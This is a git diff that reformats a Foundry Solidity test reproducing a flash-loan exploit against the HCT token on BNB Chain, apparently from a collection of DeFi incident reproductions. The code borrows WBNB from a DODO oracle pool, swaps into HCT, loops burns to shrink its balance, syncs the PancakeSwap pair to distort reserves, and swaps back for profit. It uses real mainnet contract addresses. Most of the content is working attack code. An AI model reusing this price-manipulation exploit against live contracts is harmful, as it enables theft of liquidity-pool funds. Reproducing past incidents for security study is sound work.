@@ -14,8 +14,7 @@ import "./interface.sol";
 // Twitter Guy : https://twitter.com/leovctech/status/1699775506785198499
 // Hacking God : https://www.google.com/
 
-
-interface ICoinToken{
+interface ICoinToken {
     function balanceOf(address account) external view returns (uint256);
 
     function transfer(address recipient, uint256 amount) external returns (bool);
@@ -33,17 +32,16 @@ interface ICoinToken{
     event Approval(address indexed owner, address indexed spender, uint256 value);
 }
 
-
 contract ContractTest is Test {
     IPancakePair PancakePair = IPancakePair(0xdbE783014Cb0662c629439FBBBa47e84f1B6F2eD);
     IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     ICoinToken HCT = ICoinToken(0x0FDfcfc398Ccc90124a0a41d920d6e2d0bD8CcF5);
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
-    uint baseAMount = 2_200_000_000_000_000_000_000;
+    uint256 baseAMount = 2_200_000_000_000_000_000_000;
 
     function setUp() public {
-        vm.createSelectFork("bsc", 31528198 - 1);
+        vm.createSelectFork("bsc", 31_528_198 - 1);
         vm.label(address(PancakePair), "PancakePair");
         vm.label(address(router), "PancakeRouter");
         vm.label(address(WBNB), "WBNB");
@@ -52,18 +50,18 @@ contract ContractTest is Test {
         approveAll();
     }
 
-    function testExploit() external{
-        uint startBNB = WBNB.balanceOf(address(this));
+    function testExploit() external {
+        uint256 startBNB = WBNB.balanceOf(address(this));
         console.log("Before Start: %d BNB", startBNB);
 
         DPPOracle.flashLoan(baseAMount, 0, address(this), abi.encode(baseAMount));
 
-        uint intRes =  WBNB.balanceOf(address(this))/1 ether;
-        uint decRes =  WBNB.balanceOf(address(this)) - intRes * 1e18;
+        uint256 intRes = WBNB.balanceOf(address(this)) / 1 ether;
+        uint256 decRes = WBNB.balanceOf(address(this)) - intRes * 1e18;
         console.log("Attack Exploit: %s.%s BNB", intRes, decRes);
     }
 
-    function DPPFlashLoanCall(address sender, uint amount, uint quoteAmount, bytes calldata data) external {
+    function DPPFlashLoanCall(address sender, uint256 amount, uint256 quoteAmount, bytes calldata data) external {
         swapWBNBtoHCT();
         burn();
         PancakePair.sync();
@@ -72,25 +70,29 @@ contract ContractTest is Test {
     }
 
     function swapWBNBtoHCT() internal {
-        uint amountIn = baseAMount;
+        uint256 amountIn = baseAMount;
         address[] memory path = new address[](2);
         (path[0], path[1]) = (address(WBNB), address(HCT));
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 1, path, address(this), type(uint256).max);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amountIn, 1, path, address(this), type(uint256).max
+        );
     }
 
     function burn() internal {
-        while(true){
-            if(HCT.balanceOf(address(this)) <= 70){
+        while (true) {
+            if (HCT.balanceOf(address(this)) <= 70) {
                 break;
             }
-            HCT.burn(HCT.balanceOf(address(this))*8/10 - 1);
+            HCT.burn(HCT.balanceOf(address(this)) * 8 / 10 - 1);
         }
     }
 
     function swapHCTtoWBNB() internal {
         address[] memory path = new address[](2);
         (path[0], path[1]) = (address(HCT), address(WBNB));
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(HCT.balanceOf(address(this)), 10, path, address(this), type(uint256).max);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            HCT.balanceOf(address(this)), 10, path, address(this), type(uint256).max
+        );
     }
 
     function approveAll() internal {
